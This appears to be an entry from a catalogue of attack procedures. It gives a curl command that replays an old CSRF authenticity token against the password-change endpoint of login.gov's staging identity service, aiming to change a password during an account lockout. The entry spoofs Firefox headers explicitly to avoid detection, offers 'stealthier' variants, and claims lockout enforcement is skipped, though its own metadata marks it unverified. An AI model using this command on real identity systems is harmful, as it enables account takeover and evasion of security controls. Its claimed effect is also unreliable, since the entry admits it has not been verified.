---
data: >-
  curl -X POST https://idp.staging.login.gov/manage/password -H "Content-Type:
  application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0 (Windows NT
  10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0" -H "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H
  "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" -H "Referer:
  https://staging.login.gov/manage/password" -H "Cookie: AWSALB=...;
  ahoy_visitor=...; ..." -H "Connection: close" -H "Upgrade-Insecure-Requests:
  1" -d
  "utf8=%E2%9C%93&_method=patch&authenticity_token=bGs%2FBZHewYdpRsyPIe108KMc2sR1mK9SL1bbi0X%2F9IYZDJ%2Bh3SpUN79l84qk%2FXZS1%2Fx6Nd9VBVR%2BNCR2a95NZQ%3D%3D&update_user_password_form[password]=test_?123+&commit=Update"
tags:
  - auth-bypass
  - password-reset
type: command
executor: bash
platforms:
  - Web
id: acc3f198-5aa5-43ba-a8d3-7a5d0d526ac2
created_at: '2025-12-14T17:24:45.485Z'
updated_at: '2025-12-14T17:24:45.485Z'
verified: false
validated: true
submitted: true
---
# post-manage-password-bypass-lockout

## Command

```bash
curl -X POST https://idp.staging.login.gov/manage/password \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  -H "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" \
  -H "Referer: https://staging.login.gov/manage/password" \
  -H "Cookie: AWSALB=...; ahoy_visitor=...; ..." \
  -H "Connection: close" \
  -H "Upgrade-Insecure-Requests: 1" \
  -d "utf8=%E2%9C%93&_method=patch&authenticity_token=bGs%2FBZHewYdpRsyPIe108KMc2sR1mK9SL1bbi0X%2F9IYZDJ%2Bh3SpUN79l84qk%2FXZS1%2Fx6Nd9VBVR%2BNCR2a95NZQ%3D%3D&update_user_password_form[password]=test_?123+&commit=Update"
```

## Description

This curl command sends a POST request to the /manage/password endpoint in login.gov staging, using an old authenticity_token to bypass account lockouts and update the password. It simulates a browser request to change the password during a lockout period.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `-H "Content-Type: ..."` | Sets form-encoded content type | Yes |
| `-H "User-Agent: ..."` | Mimics browser headers to avoid detection | Yes |
| `-d "..."` | Payload with form data including authenticity_token and new password | Yes |
| `authenticity_token` | CSRF token (reused old one) | Yes |
| `update_user_password_form[password]` | New password value | Yes |
| `commit` | Submit button value | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://idp.staging.login.gov/manage/password -H "Content-Type: application/x-www-form-urlencoded" -d "authenticity_token=OLD_TOKEN&update_user_password_form[password]=newpass&commit=Update"
```

### Advanced Usage

Include full headers as shown in the command for stealthier requests mimicking Firefox 54.

```bash
curl -X POST https://idp.staging.login.gov/manage/password -H "..." -d "..." --cookie "session=..."
```

## Expected Output

HTTP 200 OK with HTML response indicating "Password updated successfully" or redirect to login page. No lockout enforcement applied.

## Related

- [[Related Procedure: Bypass-Account-Lockout-with-Old-Authenticity-Token]]
